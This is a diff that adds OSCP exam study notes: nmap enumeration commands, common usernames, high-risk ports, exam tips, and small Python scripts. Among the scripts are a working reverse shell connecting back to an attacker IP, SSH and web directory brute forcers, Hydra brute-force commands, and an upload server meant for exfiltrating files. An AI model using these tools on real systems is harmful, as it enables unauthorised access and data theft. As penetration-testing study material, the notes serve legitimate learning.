@@ -28,6 +28,506 @@ prepare report
 
 ////////////////////////////////
 
+3AD and 3 individual machines 
+nmap commands
+
+For your OSCP exam with 3 Active Directory (AD) environments and 3 individual machines, here are some effective nmap commands for thorough enumeration:
+
+1. Quick Scan (Initial Recon)
+
+Start with a quick scan to identify open ports.
+
+nmap -Pn -sS -p- --min-rate=10000 -v [IP Address]
+
+	•	-Pn: No ping (skip host discovery to avoid detection issues).
+	•	-sS: SYN scan (stealthier than a full TCP connect).
+	•	-p-: Scan all 65,535 ports.
+	•	--min-rate=10000: Speed up the scan.
+	•	-v: Verbose mode.
+
+2. Service Version and OS Detection
+
+Once you know the open ports, run a more detailed scan to enumerate versions and OS.
+
+nmap -Pn -sC -sV -O -p [open ports] [IP Address]
+
+	•	-sC: Default scripts for more detailed info (e.g., vulnerable services).
+	•	-sV: Version detection of services.
+	•	-O: OS detection.
+	•	-p [open ports]: Only scan the open ports identified earlier to save time.
+
+3. Aggressive Scan (For AD)
+
+For Active Directory environments, you want more aggressive information gathering. Use:
+
+nmap -Pn -A -p [open ports] --script=smb-os-discovery,smb-enum-shares,smb-enum-users [IP Address]
+
+	•	-A: Aggressive scan (includes OS detection, version detection, script scanning).
+	•	--script: Run specific NSE scripts to enumerate SMB shares and users, which is helpful for AD environments.
+
+4. LDAP Enumeration (For AD)
+
+If LDAP (port 389) is open, run a scan to enumerate users and groups.
+
+nmap -Pn -p 389 --script=ldap-rootdse,ldap-search,ldap-novell-getpass [IP Address]
+
+This will gather valuable information from the LDAP service if it’s exposed.
+
+5. SMB and Kerberos (For AD)
+
+For Active Directory machines, SMB and Kerberos can provide good attack vectors.
+
+nmap -Pn -p 445 --script=smb-enum-domains,smb-enum-groups,smb-enum-users [IP Address]
+
+For Kerberos (port 88):
+
+nmap -Pn -p 88 --script=krb5-enum-users [IP Address]
+
+These commands will help you gather as much initial information as possible to identify potential weaknesses or entry points.
+
+
+////////////////////////////////
+
+Common usernames  :
+
+Here are some common usernames that are frequently used in OSCP exam machines, especially for services like SSH, FTP, SMB, web applications, and more. These usernames are often paired with weak or default passwords, making them potential targets during your penetration testing.
+
+Common Usernames:
+
+	1.	admin
+	2.	administrator
+	3.	root
+	4.	guest
+	5.	user
+	6.	test
+	7.	ubuntu
+	8.	oracle
+	9.	postgres
+	10.	ftp
+	11.	mysql
+	12.	apache
+	13.	www-data
+	14.	nobody
+	15.	backup
+	16.	support
+	17.	service
+	18.	developer
+	19.	sysadmin
+	20.	tomcat (for Apache Tomcat services)
+	21.	jenkins (for Jenkins services)
+	22.	pi (commonly used in Raspberry Pi or IoT-related machines)
+	23.	john (common user for CTF-style boxes)
+	24.	bob
+	25.	joe
+
+Active Directory Environments:
+
+For Windows or Active Directory environments, these are typical usernames:
+
+	1.	administrator (common in AD setups)
+	2.	svc_* (service accounts, e.g., svc_admin)
+	3.	helpdesk
+	4.	guest
+	5.	admin1
+	6.	manager
+	7.	itadmin
+	8.	domainadmin
+	9.	backupadmin
+
+Common Naming Conventions:
+
+	•	svc_*: Service accounts often start with svc_.
+	•	dev_*: Developer accounts sometimes follow this pattern.
+	•	test_*: Accounts related to testing environments.
+
+How to Use These Usernames in Enumeration:
+
+When enumerating usernames via SMB, FTP, SSH, or web-based login forms, you can either:
+
+	•	Use brute-force tools like Hydra or Metasploit to test these usernames against weak passwords.
+	•	Use Nmap scripts or Enum4linux to enumerate potential usernames from services.
+
+Example: Brute-Forcing SSH Logins Using Hydra
+
+hydra -L usernames.txt -P passwords.txt ssh://TARGET_IP -t 4
+
+This command uses a list of usernames (usernames.txt) and passwords (passwords.txt) to brute-force an SSH login.
+
+Example: SMB User Enumeration with Enum4linux
+
+enum4linux -a TARGET_IP
+
+This tool helps you enumerate usernames, shares, and other useful information from SMB.
+
+By focusing on these common usernames during your OSCP exam, you can often find weak or misconfigured accounts that can lead to further exploitation.
+
+Good luck with your exam!
+
+////////////////////////////////
+
+
+ high risk ports 
+
+ high-risk ports to focus on when scanning during the OSCP exam. These ports are commonly associated with services that could have exploitable vulnerabilities or misconfigurations, making them key targets during your penetration testing:
+
+1. Port 21 (FTP - File Transfer Protocol)
+
+	•	Risks: Anonymous login, weak credentials, plain-text transmission, writable directories.
+	•	Nmap Command:
+
+nmap -p 21 --script=ftp-anon,ftp-bounce,ftp-syst [IP]
+
+
+
+2. Port 22 (SSH - Secure Shell)
+
+	•	Risks: Weak SSH keys, outdated versions, brute-force attacks.
+	•	Nmap Command:
+
+nmap -p 22 --script=ssh-auth-methods,ssh-brute [IP]
+
+
+
+3. Port 25 (SMTP - Simple Mail Transfer Protocol)
+
+	•	Risks: Misconfigured mail servers, open relay, information disclosure.
+	•	Nmap Command:
+
+nmap -p 25 --script=smtp-enum-users,smtp-open-relay [IP]
+
+
+
+4. Port 53 (DNS - Domain Name System)
+
+	•	Risks: DNS zone transfers, misconfigured DNS servers.
+	•	Nmap Command:
+
+nmap -p 53 --script=dns-zone-transfer,dns-nsid [IP]
+
+
+
+5. Port 80/443 (HTTP/HTTPS - Web Services)
+
+	•	Risks: Web vulnerabilities (e.g., SQL injection, XSS), outdated software.
+	•	Nmap Command:
+
+nmap -p 80,443 --script=http-enum,http-title,http-methods [IP]
+
+
+
+6. Port 110 (POP3 - Post Office Protocol v3)
+
+	•	Risks: Plain-text authentication, brute-force attacks, vulnerable to man-in-the-middle attacks.
+	•	Nmap Command:
+
+nmap -p 110 --script=pop3-capabilities, pop3-ntlm-info [IP]
+
+
+
+7. Port 135/139 (Microsoft RPC/NetBIOS)
+
+	•	Risks: Information leakage, SMB-related vulnerabilities (e.g., EternalBlue), weak authentication.
+	•	Nmap Command:
+
+nmap -p 135,139 --script=msrpc-enum,smb-os-discovery [IP]
+
+
+
+8. Port 143 (IMAP - Internet Message Access Protocol)
+
+	•	Risks: Plain-text transmission, weak credentials.
+	•	Nmap Command:
+
+nmap -p 143 --script=imap-capabilities [IP]
+
+
+
+9. Port 445 (SMB - Server Message Block)
+
+	•	Risks: Exploits like EternalBlue, SMB enumeration, misconfigurations, weak passwords.
+	•	Nmap Command:
+
+nmap -p 445 --script=smb-enum-shares,smb-enum-users,smb-vuln-ms17-010 [IP]
+
+
+
+10. Port 3306 (MySQL)
+
+	•	Risks: Weak/default passwords, SQL injection.
+	•	Nmap Command:
+
+nmap -p 3306 --script=mysql-enum,mysql-brute [IP]
+
+
+
+11. Port 3389 (RDP - Remote Desktop Protocol)
+
+	•	Risks: Weak authentication, brute-force attacks, BlueKeep vulnerability (CVE-2019-0708).
+	•	Nmap Command:
+
+nmap -p 3389 --script=rdp-enum-encryption,rdp-vuln-ms12-020 [IP]
+
+
+
+12. Port 8080 (HTTP Alternative)
+
+	•	Risks: Often used for web management interfaces with weak or default credentials, outdated software.
+	•	Nmap Command:
+
+nmap -p 8080 --script=http-enum,http-title [IP]
+
+
+
+13. Port 5900 (VNC - Virtual Network Computing)
+
+	•	Risks: Weak authentication, remote desktop access.
+	•	Nmap Command:
+
+nmap -p 5900 --script=vnc-info,vnc-brute [IP]
+
+
+
+14. Port 8089 (Splunk Web Service)
+
+	•	Risks: Default configurations, weak credentials.
+	•	Nmap Command:
+
+nmap -p 8089 --script=http-title [IP]
+
+
+
+15. Port 2049 (NFS - Network File System)
+
+	•	Risks: Misconfigured shares, allowing unauthorized access to files.
+	•	Nmap Command:
+
+nmap -p 2049 --script=nfs-ls,nfs-showmount [IP]
+
+
+
+16. Port 5000 (Web Services, Docker)
+
+	•	Risks: Docker misconfigurations, exposed management interfaces.
+	•	Nmap Command:
+
+nmap -p 5000 --script=http-title,http-methods [IP]
+
+
+
+17. Port 8081 (HTTP Admin Panels)
+
+	•	Risks: Weak or default credentials, outdated admin portals.
+	•	Nmap Command:
+
+nmap -p 8081 --script=http-title [IP]
+
+
+
+18. Port 8443 (Alternative HTTPS)
+
+	•	Risks: Web applications or management interfaces running insecurely, default credentials.
+	•	Nmap Command:
+
+nmap -p 8443 --script=http-enum,http-title [IP]
+
+
+
+These high-risk ports and the corresponding services are commonly vulnerable or misconfigured, making them prime targets during the OSCP exam. Always start with Nmap to enumerate open ports, services, and versions, and follow up with relevant exploit attempts or further scanning based on what you find.
+
+////////////////////////////////
+
+
+ python scripts 
+
+Here are some small Python scripts that can be useful for various tasks in the OSCP exam machines:
+
+1. Simple Reverse Shell (Python)
+
+A basic Python reverse shell to get a connection back to your machine.
+
+On the attacker machine (set up a listener using netcat):
+
+nc -lvnp 4444
+
+On the target machine:
+
+import socket
+import subprocess
+import os
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('YOUR_IP', 4444))  # Replace YOUR_IP with your attacker's IP
+os.dup2(s.fileno(), 0)  # stdin
+os.dup2(s.fileno(), 1)  # stdout
+os.dup2(s.fileno(), 2)  # stderr
+subprocess.call(['/bin/sh', '-i'])
+
+This script opens a reverse shell to your listener.
+
+2. Basic Directory Bruteforcer
+
+If you’re performing web enumeration and want to brute-force directories.
+
+import requests
+
+url = 'http://TARGET_IP/'  # Replace with target IP
+wordlist = '/path/to/wordlist.txt'  # Replace with your wordlist
+
+with open(wordlist, 'r') as file:
+    for line in file:
+        directory = line.strip()
+        full_url = url + directory
+        response = requests.get(full_url)
+        if response.status_code == 200:
+            print(f"Found: {full_url}")
+
+This script reads from a wordlist and checks if the directories exist on the target web server.
+
+3. Simple Port Scanner
+
+A quick Python script to scan ports.
+
+import socket
+
+target = 'TARGET_IP'  # Replace with the target IP
+ports = [22, 80, 443, 445, 3306, 8080, 3389]  # Add or modify ports as needed
+
+for port in ports:
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(1)
+    result = sock.connect_ex((target, port))
+    if result == 0:
+        print(f"Port {port} is open")
+    sock.close()
+
+This script checks if the specified ports are open on the target machine.
+
+4. Linux Privilege Escalation Checker
+
+A basic script to help with privilege escalation enumeration on a Linux machine.
+
+import os
+
+def check_sudo():
+    print("[+] Checking for sudo privileges...")
+    os.system('sudo -l')
+
+def check_suid():
+    print("[+] Checking for SUID binaries...")
+    os.system('find / -perm -4000 2>/dev/null')
+
+def check_cron():
+    print("[+] Checking for cron jobs...")
+    os.system('cat /etc/crontab')
+
+if __name__ == "__main__":
+    check_sudo()
+    check_suid()
+    check_cron()
+
+This script checks for sudo privileges, SUID binaries, and cron jobs, which are common privilege escalation vectors.
+
+5. HTTP Server (File Transfer)
+
+A one-liner for file transfer using Python’s built-in HTTP server.
+
+python3 -m http.server 8080
+
+Run this on your attack machine to serve files on port 8080. You can download files from the target machine using wget or curl.
+
+6. Simple File Upload Server (Python)
+
+This script allows file upload to your machine, which is helpful when you need to exfiltrate files.
+
+import http.server
+import socketserver
+
+class SimpleHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
+    def do_POST(self):
+        length = int(self.headers['Content-Length'])
+        field_data = self.rfile.read(length)
+        with open('uploaded_file', 'wb') as f:
+            f.write(field_data)
+        self.send_response(200)
+        self.end_headers()
+
+port = 8000
+handler = SimpleHTTPRequestHandler
+httpd = socketserver.TCPServer(("", port), handler)
+print(f"Serving on port {port}")
+httpd.serve_forever()
+
+Run this on your attack machine, and you can send files to it from the target machine with curl or any HTTP tool.
+
+7. Basic SSH Brute Forcer
+
+A simple SSH brute-force script using paramiko.
+
+import paramiko
+
+target_ip = 'TARGET_IP'
+username = 'root'
+passwords = ['password1', 'password2', 'password3']  # Replace with a list or wordlist
+
+for password in passwords:
+    try:
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh.connect(target_ip, username=username, password=password)
+        print(f"[+] Success: {password}")
+        ssh.close()
+        break
+    except:
+        print(f"[-] Failed: {password}")
+
+This brute-forces SSH login with a list of passwords. Be mindful of rate limits or lockout policies.
+
+These Python scripts are lightweight and can help you automate or speed up your penetration testing during the OSCP exam. 
+
+
+////////////////////////////////
+
+Public Exploit Databases:
+	•	Exploit-DB (https://www.exploit-db.com): Useful for finding public exploits for vulnerable software.
+	•	PacketStorm Security (https://packetstormsecurity.com): Another resource for finding exploits and security tools.
+ 
+
+
+////////////////////////////////
+
+Here are some last-minute tips for your OSCP exam:
+
+	1.	Time Management:
+	•	Break down the exam into segments. Spend a set amount of time (e.g., 30 minutes to 1 hour) on each machine before moving to the next. Prioritize the easier ones to gain points quickly.
+	2.	Enumeration is Key:
+	•	Start every machine with thorough enumeration (use tools like nmap, Gobuster, Nikto, etc.). Information gathered from this will guide your approach.
+	3.	Document Everything:
+	•	Keep detailed notes of your commands, exploits, and configurations. This will help with report writing and allow you to backtrack if needed.
+	4.	Buffer Overflow (if applicable):
+	•	Follow the standard methodology: find the offset, control EIP, etc. Refer to your cheat sheets for buffer overflow to ensure a smooth process.
+	5.	Privilege Escalation:
+	•	For Linux, check for SUID files, weak permissions, or misconfigurations. Use tools like LinPEAS or Linux Smart Enumeration.
+	•	For Windows, look into vulnerable services or unquoted paths. Tools like WinPEAS or PowerUp will help here.
+	6.	Don’t Panic:
+	•	If stuck, take a short break, clear your mind, and come back to it. Sometimes, a fresh perspective helps.
+	7.	Exploit Modification:
+	•	Be prepared to modify public exploits. Often, they won’t work out-of-the-box. Focus on understanding the code to tweak it if necessary.
+	8.	Buffer Management:
+	•	Allocate your time carefully. If you’re spending too much time on one machine, move on to another.
+	9.	Have Backups:
+	•	Make sure you have all the required tools installed and working before the exam. Keep your VPN connection stable.
+	10.	Focus on Points:
+
+	•	Remember, the goal is to hit the passing score, so prioritize systems based on difficulty and your strengths.
+
+All the best for your exam!
+
+
+
+//////////////////////////////
+
+
+
  Security:
             Sources:
                 https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html-single/using_selinux (Using SELinux)
